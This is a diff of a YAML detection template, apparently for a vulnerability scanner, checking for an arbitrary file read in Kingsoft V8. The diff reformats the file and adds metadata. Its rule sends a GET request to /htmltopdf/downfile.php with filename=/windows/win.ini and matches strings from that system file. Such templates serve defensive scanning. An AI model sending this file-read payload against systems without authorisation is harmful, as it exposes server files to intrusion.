@@ -1,15 +1,19 @@
 id: kingsoft-v8-file-read
 
 info:
-    name: Kingsoft V8 File Read
-    author: kzaopa(https://github.com/kzaopa)
-    severity: high
-    verified: false
+  name: Kingsoft V8 File Read
+  author: kzaopa
+  severity: high
+  verified: false
+  description: |-
+    Kingsoft V8 File Read
+  tags: kingsoft,file-read
+  created: 2023/10/13
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /htmltopdf/downfile.php?filename=/windows/win.ini
-        expression: response.status == 200 && response.body.bcontains(b'bit app support') && response.body.bcontains(b'fonts') && response.body.bcontains(b'extensions')
+  r0:
+    request:
+      method: GET
+      path: /htmltopdf/downfile.php?filename=/windows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b'bit app support') && response.body.bcontains(b'fonts') && response.body.bcontains(b'extensions')
 expression: r0()
